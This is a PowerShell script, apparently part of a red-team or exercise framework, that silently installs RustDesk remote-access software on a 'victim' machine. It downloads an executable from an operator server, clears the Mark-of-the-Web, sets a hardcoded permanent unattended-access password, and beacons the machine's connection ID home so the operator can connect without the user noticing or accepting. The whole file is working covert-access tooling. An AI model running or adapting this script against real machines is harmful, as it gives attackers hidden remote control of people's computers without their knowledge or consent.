# ttx/rmm/rustdesk/install.ps1 - RustDesk host, SILENT variant
# Dot-sourced by rmm.ps1 (the tool-agnostic loader): $Base, $BeaconUrl, $Log
# and the Beacon() function are already in scope when this runs.
#
# Downloads rustdesk-host.exe, installs it with --silent-install, sets the
# permanent unattended password, then beacons the connection ID home.
# No wizard - the install is invisible to the victim.

$Url   = "$Base/rmm/rustdesk/rustdesk-host.exe"
$File  = "$env:PUBLIC\rustdesk-host.exe"
$Check = 'rustdesk'
$Desc  = 'RustDesk host (silent)'

# Deployment settings - edit these per deployment:
#   ConfigString : encrypted config string from a RustDesk Server Pro console
#                 (rustdesk.com/docs -> Client -> Configuring RustDesk).
#                 Leave empty to use the public RustDesk servers.
#   Password     : permanent unattended-access password. Set after install;
#                 the machine's connection ID is then sent home via beacon -
#                 you connect with <ID> + this password from your RustDesk
#                 client (see README: "Connecting to a RustDesk victim").
$ConfigString = ''
$Password     = 'ttx-lab'      # CHANGE ME per deployment

# Locate the installed binary (the installer copies itself into
# Program Files as part of --silent-install); fall back to the download
$RdExe = "$env:ProgramFiles\RustDesk\rustdesk.exe"
if (-not (Test-Path $RdExe)) { $RdExe = "${env:ProgramFiles(x86)}\RustDesk\rustdesk.exe" }
if (-not (Test-Path $RdExe)) { $RdExe = $File }

# Already running (e.g. a reused victim)? Skip the install but STILL
# re-arm the password + report the ID below - reused victims must stay
# connectable without a cleanup in between.
$WasRunning = [bool](Get-Process -Name $Check -ErrorAction SilentlyContinue)

if ($WasRunning) {
  Add-Content $Log "$(Get-Date -f s)  already running - skipping install, re-arming"
  Beacon 'rustdesk-already-running'
} else {
  # Download if not present + clear MOTW
  if (-not (Test-Path $File)) {
    Invoke-WebRequest -Uri $Url -OutFile $File -UseBasicParsing
    Add-Content $Log "$(Get-Date -f s)  downloaded $Url"
  }
  Unblock-File $File

  if (-not (Test-Path $File)) {
    Beacon 'rustdesk-download-failed'
    Add-Content $Log "$(Get-Date -f s)  ERROR: downloaded exe missing"
    return
  }

  # SILENT INSTALL - no user interaction
  Beacon 'rustdesk-install-launch'
  $RdArgs = @('--silent-install')
  if ($ConfigString) { $RdArgs += @('--config', $ConfigString) }
  Start-Process $File -ArgumentList $RdArgs
  Add-Content $Log "$(Get-Date -f s)  launched $Desc (silent), args: $($RdArgs -join ' ')"

  # Poll for the service to come up
  $Running = $false
  for ($i = 0; $i -lt 36; $i++) {
    Start-Sleep -Seconds 10
    if (Get-Process -Name $Check -ErrorAction SilentlyContinue) { $Running = $true; break }
  }
  if (-not $Running) {
    Beacon 'rustdesk-notready'
    Add-Content $Log "$(Get-Date -f s)  service did not come up within 6 min"
    return
  }
  Beacon 'rustdesk-installed'
}

# ---- arm + report (fresh installs AND already-running machines) ----------

# Set the permanent unattended-access password so the operator can connect
# without anyone clicking "accept" on the victim screen
if ($Password) {
  Start-Process $RdExe -ArgumentList '--password', $Password -WindowStyle Hidden -Wait
  Beacon 'rustdesk-password-set'
  Add-Content $Log "$(Get-Date -f s)  permanent unattended password set"
}

# Fetch the machine's connection ID and BEACON IT HOME - this is how the
# operator learns which ID to connect to:
#   docker logs ttx-lab | grep rustdesk-id
$Id = ''
for ($i = 0; $i -lt 12; $i++) {
  $Id = (& $RdExe --get-id 2>$null | Out-String).Trim()
  if ($Id -match '^\d+$') { break }
  Start-Sleep -Seconds 5
}
if ($Id -match '^\d+$') {
  Beacon "rustdesk-id-$Id"
  Add-Content $Log "$(Get-Date -f s)  connection ID: $Id (connect with it + the password)"
} else {
  Beacon 'rustdesk-id-unknown'
  Add-Content $Log "$(Get-Date -f s)  could not read connection ID"
}
